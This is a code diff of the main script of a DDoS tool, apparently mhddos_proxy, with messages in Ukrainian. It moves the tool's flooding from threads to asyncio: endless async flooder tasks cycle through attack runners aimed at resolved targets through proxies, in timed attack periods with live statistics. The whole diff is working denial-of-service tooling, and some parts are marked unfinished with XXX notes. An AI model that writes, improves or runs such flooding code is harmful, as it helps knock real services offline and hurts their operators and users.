@@ -1,3 +1,6 @@
+import asyncio
+from contextlib import suppress
+
 # @formatter:off
 import colorama; colorama.init()
 # @formatter:on
@@ -15,9 +18,9 @@ from src.core import (
     DNS_WORKERS, Params, Stats, PADDING_THREADS
 )
 from src.dns_utils import resolve_all_targets
-from src.mhddos import main as mhddos_main
+from src.mhddos import main as mhddos_main, async_main as mhddos_async_main
 from src.output import show_statistic, print_banner, print_progress
-from src.proxies import update_proxies
+from src.proxies import update_proxies, wrap_async
 from src.system import fix_ulimits, is_latest_version
 from src.targets import Targets
 
@@ -103,7 +106,15 @@ def run_flooders(num_threads, switch_after) -> List[Flooder]:
     return threads
 
 
-def run_ddos(
+# XXX: need a way stop on the signal
+async def async_flooder(runnables):
+    while True:
+        with suppress(Exception):
+            await next(runnables).run()
+
+
+# XXX: UDP
+async def run_async_ddos(
     proxies,
     targets,
     tcp_flooders,
@@ -114,6 +125,7 @@ def run_ddos(
     vpn_mode,
     debug,
     table,
+    total_threads,
 ):
     statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
     proxies_cnt = len(proxies)
@@ -140,10 +152,19 @@ def run_ddos(
                 % (params.target.url.host, params.target.url.port, params.method)
             )
 
+    async def stats_printer():
+        refresh_rate = 5
+        ts = time.time()
+        while True:
+            await asyncio.sleep(refresh_rate)
+            passed = time.time() - ts
+            ts = time.time()
+            show_statistic(statistics, refresh_rate, table, vpn_mode, proxies_cnt, period, passed)
+    
     logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
-    if not (table or debug):
-        # Keep the docs/info on-screen for some time before outputting the logger.info above
-        time.sleep(5)
+    #if not (table or debug):
+    #    # Keep the docs/info on-screen for some time before outputting the logger.info above
+    #    time.sleep(5)
 
     for target in targets:
         assert target.is_resolved, "Unresolved target cannot be used for attack"
@@ -163,33 +184,17 @@ def run_ddos(
         else:
             raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
 
-    for flooder in tcp_flooders:
-        flooder.enqueue(event, kwargs_list)
+    tasks = []
+    runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
+    for _ in range(total_threads):
+        tasks.append(asyncio.ensure_future(async_flooder(runnables_iter)))
 
-    if udp_kwargs_list:
-        for flooder in udp_flooders:
-            flooder.enqueue(event, udp_kwargs_list)
+    tasks.append(asyncio.ensure_future(stats_printer()))
 
-    event.set()
-
-    if not (table or debug):
-        print_progress(period, 0, len(proxies))
-        time.sleep(period)
-    else:
-        ts = time.time()
-        refresh_rate = 5
-        time.sleep(refresh_rate)
-        while True:
-            passed = time.time() - ts
-            if passed > period:
-                break
-            show_statistic(statistics, refresh_rate, table, vpn_mode, proxies_cnt, period, passed)
-            time.sleep(refresh_rate)
-
-    event.clear()
+    await asyncio.gather(*tasks)
 
 
-def start(args):
+async def start(args):
     print_banner(args.vpn_mode)
     fix_ulimits()
 
@@ -214,14 +219,11 @@ def start(args):
     # padding threads are necessary to create a "safety buffer" for the
     # system that hit resources limitation when running main pools.
     # it will be deallocated as soon as all other threads are up and running.
-    padding_threads = DaemonThreadPool(PADDING_THREADS).start_all()
+    #padding_threads = DaemonThreadPool(PADDING_THREADS).start_all()
     dns_executor = DaemonThreadPool(DNS_WORKERS).start_all()
-    udp_flooders = run_flooders(args.udp_threads, WORK_STEALING_DISABLED)
-    tcp_flooders = run_flooders(args.threads, args.switch_after)
-    padding_threads.terminate_all()
-    del padding_threads
 
-    while True:
+    # XXX: periodic updates
+    if True:
         if is_old_version:
             print(
                 f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')
@@ -253,23 +255,27 @@ def start(args):
         else:
             proxies = list(update_proxies(args.proxies, proxies))
 
+        proxies = list(wrap_async(proxies))
+
         period = 300
-        run_ddos(
+        await run_async_ddos(
             proxies,
             targets,
-            tcp_flooders,
-            udp_flooders,
+            None, 
+            None,
             period,
             args.rpc,
             args.http_methods,
             args.vpn_mode,
             args.debug,
             args.table,
+            args.threads,
         )
 
 
+# XXX: try uvloop when available
 if __name__ == '__main__':
     try:
-        start(init_argparse().parse_args())
+        asyncio.run(start(init_argparse().parse_args()))
     except KeyboardInterrupt:
         logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
